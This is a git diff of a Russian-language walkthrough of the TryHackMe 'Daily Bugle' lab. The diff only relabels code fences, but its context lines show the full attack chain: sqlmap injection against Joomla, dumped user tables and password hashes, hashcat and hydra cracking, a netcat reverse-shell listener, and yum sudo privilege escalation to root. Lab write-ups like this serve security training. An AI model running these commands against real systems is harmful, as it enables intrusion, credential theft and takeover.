@@ -24,7 +24,7 @@ export ip=10.10.172.90 && nmap_ctf $ip
 
 ### nmap
 
-```
+```bash
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
 | ssh-hostkey: 
@@ -53,7 +53,7 @@ IP ID Sequence Generation: All zeros
 ```
 
 ### robots.txt
-```
+```bash
 # If the Joomla site is installed within a folder 
 # eg www.example.com/joomla/ then the robots.txt file 
 # MUST be moved to the site root 
@@ -99,17 +99,17 @@ Disallow: /tmp/
 `http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27`
 
 Предлагаемая команда
-```
+```bash
 sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
 ```
 
 Но `boolean-based blind` и `time-based blind` будут долго обрабатываться, поэтому немного скорректировал команду
-```
+```bash
 sqlmap -u "http://10.10.154.91/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=3 --random-agent --dbms=mysql --technique=UE --dbs -p list[fullordering]
 ```
 
 В результате нашел 5 баз данных
-```
+```bash
 available databases [5]:
 [*] information_schema
 [*] joomla
@@ -119,10 +119,10 @@ available databases [5]:
 ```
 
 **mysql db tables**
-```
+```bash
 sqlmap -u "http://10.10.154.91/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=3 --random-agent --dbms=mysql --technique=UE -D mysql --tables -p list[fullordering]
 ```
-```
+```bash
 Database: mysql
 [24 tables]
 +---------------------------+
@@ -154,7 +154,7 @@ Database: mysql
 ```
 
 У таблицы `user` 42 колонки, меня интересует `User` `Password`
-```
+```bash
 Database: mysql
 Table: user
 [6 entries]
@@ -185,7 +185,7 @@ Table: user
 ```
 
 Делаю дамп таблицы `#__users` из бд `joomla`
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - DailyBugle/exploits]
 └─$ sqlmap -u "http://10.10.154.91/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=3 --random-agent --dbms=mysql --technique=UE -D joomla -T \#__users --dump -p list[fullordering]
 
@@ -203,7 +203,7 @@ python exploit также дал имя пользователя и hash
 `>> 811 ||| Super User ||| jonah ||| jonah@tryhackme.com ||| $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`
 
 Далее можно попытаться взломать с помощью hashcat
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - DailyBugle/exploits]
 └─$ hashcat -m 3200 -a 0 hash.txt /media/sf_Exchange/Dictionaries/rockyou.txt 
 ```
@@ -220,7 +220,7 @@ python exploit также дал имя пользователя и hash
 ![reverse](screenshots/02.reverse.png)
 
 И получаю доступ
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - DailyBugle/exploits]
 └─$ nc -lvnp 4444
 listening on [any] 4444 ...
@@ -244,7 +244,7 @@ linPEAS выдал пароль в файлах
 ![pass](screenshots/03.pass.png)
 
 И он подошел к ранее найденному хэшу
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - DailyBugle/exploits]
 └─$ cat hash_mysql.txt
 *B04E65424026AC47B5626445B67352EBEFD78828
@@ -268,7 +268,7 @@ No password hashes left to crack (see FAQ)
 ```
 
 И есть 1 пользователь в /home
-```
+```bash
 ls -la /home
 total 0
 drwxr-xr-x.  3 root     root      22 Dec 14  2019 .
@@ -277,7 +277,7 @@ drwx------.  2 jjameson jjameson  99 Dec 15  2019 jjameson
 ```
 
 Проверяю креды
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - DailyBugle/exploits]
 └─$ hydra -l jjameson -P ./pass.txt -t 2 ssh://10.10.130.255
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -291,7 +291,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-08 03:43:
 ```
 
 И получаю доступ по ssh для jjameson
-```
+```bash
 [jjameson@dailybugle ~]$ ls -la
 total 16
 drwx------. 2 jjameson jjameson  99 Dec 15  2019 .
@@ -306,7 +306,7 @@ lrwxrwxrwx  1 jjameson jjameson   9 Dec 14  2019 .bash_history -> /dev/null
 ```
 
 ### sudo -l
-```
+```bash
 [jjameson@dailybugle ~]$ sudo -l
 User jjameson may run the following commands on dailybugle:
     (ALL) NOPASSWD: /usr/bin/yum
@@ -314,7 +314,7 @@ User jjameson may run the following commands on dailybugle:
 
 Эксплуатация описана тут: `https://gtfobins.github.io/gtfobins/yum/`  
 В данном случае нужно это:
-```
+```bash
 TF=$(mktemp -d)
 cat >$TF/x<<EOF
 [main]
@@ -342,7 +342,7 @@ sudo yum -c $TF/x --enableplugin=y
 
 Но придется руками копировать и вставлять построчно - не вариант.  
 Следующий код достаточно просто скопировать и вставить:
-```
+```bash
 TF=$(mktemp -d) && \
 echo -e "[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF" > "$TF/x" && \
 echo -e "[main]\nenabled=1" > "$TF/y.conf" && \
@@ -351,7 +351,7 @@ sudo yum -c $TF/x --enableplugin=y
 ```
 
 И получаю root
-```
+```bash
 [jjameson@dailybugle ~]$ TF=$(mktemp -d) && \
 > echo -e "[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF" > "$TF/x" && \
 > echo -e "[main]\nenabled=1" > "$TF/y.conf" && \
